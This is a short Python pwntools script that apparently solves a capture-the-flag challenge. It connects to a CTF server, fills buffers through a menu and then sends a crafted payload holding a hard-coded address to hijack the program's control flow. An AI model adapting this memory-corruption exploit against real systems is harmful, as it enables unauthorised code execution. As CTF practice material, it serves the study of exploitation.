from pwn import *

def Recv(p):
      ret = p.recv(timeout=1)
      print ret

p = remote('ctf2.cpaw.site', 9999)
#p = process("./blackboard")
#p = process("/home/ctf/Desktop/blackboard")
p.recv(1000,timeout=1)
p.send("1\n")
p.recv(1000,timeout=1)
p.send("AAAAAAAAAA\n")
p.recv(1000,timeout=1)
p.send("1\n")
p.recv(1000,timeout=1)
p.send("AAAAAAAAAA\n")
p.recv(1000,timeout=1)
p.send("1\n")
p.recv(1000,timeout=1)
p.send("AAAAAAAAAA\n")
p.recv(1000,timeout=1)
p.send("1\n")
p.recv(1000,timeout=1)
p.send("AAAAAAA\n")
p.recv(1000,timeout=1)
p.send("1\n")
p.recv(1000,timeout=1)
command='\n'
#command = 'abcd\x04\x08\xed\x08\n'
#command = '\x04\x08\xed\x86\n'
command = '00000\xed\x86\x04\x08\n'
p.send(command)
p.recv(1000,timeout=1)
p.send("2\n")
print p.recv(1000,timeout=3)
#p.recv(1000,timeout=3)
#p.send("2\n")
#print p.recv(1000,timeout=1)


